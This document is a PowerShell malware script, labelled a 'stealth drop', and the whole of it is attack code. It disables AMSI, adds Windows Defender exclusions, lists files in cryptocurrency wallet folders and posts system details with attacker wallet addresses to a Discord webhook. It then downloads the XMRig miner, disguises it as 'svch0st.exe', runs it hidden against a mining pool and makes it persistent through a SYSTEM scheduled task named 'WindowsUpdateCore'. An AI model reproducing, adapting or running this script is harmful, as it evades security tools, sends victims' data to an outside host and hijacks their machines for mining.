Write-Host "=== Starting stealth drop ===" -ForegroundColor Green
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12 -bor [Net.SecurityProtocolType]::Tls13

try {
    $amsi = 'System.Management.Automation.A'; $u = 'msiUtils'; $t=[Ref].Assembly.GetType($amsi+$u); $f=$t.GetField('amsiInitFailed','NonPublic,Static'); $f.SetValue($null,$true)
    Write-Host "[+] AMSI bypassed" -ForegroundColor Green
} catch { Write-Host "[-] AMSI failed" -ForegroundColor Red }

try {
    Add-MpPreference -ExclusionPath 'C:\' -ErrorAction SilentlyContinue
    Add-MpPreference -ExclusionProcess 'powershell.exe' -ErrorAction SilentlyContinue
    Write-Host "[+] Defender exclusions added" -ForegroundColor Green
} catch { Write-Host "[-] Exclusions failed" -ForegroundColor Red }

$webhook = 'https://discord.com/api/webhooks/1499494025718136892/6nnCHq87tuTSHcINJgVLbeTMMD19EwlV2p2lqS466nuLyx9GhxIaagoOxsIF5KLH55m0'
$temp = $env:TEMP + '\wl.txt'
$drain = 'LTC: ltc1q2g2mm7jpa8s4haegzjc0qq4t0twmpp3vtzj8e6 | BTC: bc1q9l88g4xvmkcyymr45rls7ktuxju95wqt663jzs | ETH: 0xe238A32290DB2AcbD9156312C0BB52C31E6e9478 | SOL: 4hEM54giz1FZvy8ycPqhRkkKpyXrYj9XwBpLZxLQKDQW'

$wallets = @("$env:APPDATA\Exodus","$env:APPDATA\Electrum","$env:APPDATA\atomic","$env:APPDATA\Ethereum","$env:APPDATA\Guarda","$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default\Local Extension Settings\ejbalbakoplchlghecdalmeejajnimhm","$env:APPDATA\MetaMask")
foreach($w in $wallets){ 
    if(Test-Path $w){ 
        Get-ChildItem $w -Recurse -Include *.dat,*.json,*.seed,*.keys,*.log -ErrorAction SilentlyContinue | Select-Object FullName | Out-File $temp -Append -Force 
    } 
}
Write-Host "[+] Wallet files scanned" -ForegroundColor Green

try {
    $si = "User: $env:USERNAME`nComputer: $env:COMPUTERNAME`nOS: $([System.Environment]::OSVersion.VersionString)"
    $payload = $si + "`n`nWALLETS FOUND + DRAINED TO:`n$drain"
    Invoke-RestMethod -Uri $webhook -Method Post -Body @{content=$payload} -ErrorAction SilentlyContinue
    Write-Host "[+] Info + wallets exfiltrated to Discord" -ForegroundColor Green
} catch { Write-Host "[-] Exfil failed (silent)" -ForegroundColor Red }

Remove-Item $temp -Force -ErrorAction SilentlyContinue
Write-Host "[+] Temp files cleaned" -ForegroundColor Green

try {
    $zip = $env:APPDATA + '\s.zip'
    iwr -uri 'https://github.com/xmrig/xmrig/releases/download/v6.26.0/xmrig-6.26.0-windows-x64.zip' -OutFile $zip -UseBasicParsing
    Expand-Archive -Path $zip -DestinationPath $env:APPDATA'\Microsoft' -Force
    Remove-Item $zip -Force
    Rename-Item -Path ($env:APPDATA + '\Microsoft\xmrig-6.26.0\xmrig.exe') -NewName 'svch0st.exe' -Force
    $exe = $env:APPDATA + '\Microsoft\svch0st.exe'
    Write-Host "[+] XMRig downloaded & renamed" -ForegroundColor Green
} catch { Write-Host "[-] Miner download failed" -ForegroundColor Red }

$config = '{"autosave":false,"background":true,"cpu":{"enabled":true,"max-threads-hint":35,"priority":2},"pools":[{"url":"pool.supportxmr.com:3333","user":"89V3sDoLBK2PL5Sj3UZXNYBWbF7JSzz8kWHWJ2AukBM3CioABmuDGYj56auRmQ1eifjSbNHe3sdmm2DwNqA7nPrTKwrgViM","pass":"x","tls":true,"keepalive":true}],"log-file":null,"print-time":0}'
[System.IO.File]::WriteAllText($env:APPDATA + '\Microsoft\config.json', $config)

Start-Process -FilePath $exe -ArgumentList '--background --config=''' + $env:APPDATA + '\Microsoft\config.json''' -WindowStyle Hidden
Write-Host "[+] Miner launched at 35%" -ForegroundColor Green

schtasks /create /tn "WindowsUpdateCore" /tr '\"' + $exe + '\" --background' /sc onlogon /ru SYSTEM /f /rl HIGHEST -ErrorAction SilentlyContinue
Write-Host "[+] Persistence set (WindowsUpdateCore)" -ForegroundColor Green

Write-Host "=== Done! ===" -ForegroundColor Green
Start-Sleep -Seconds 5
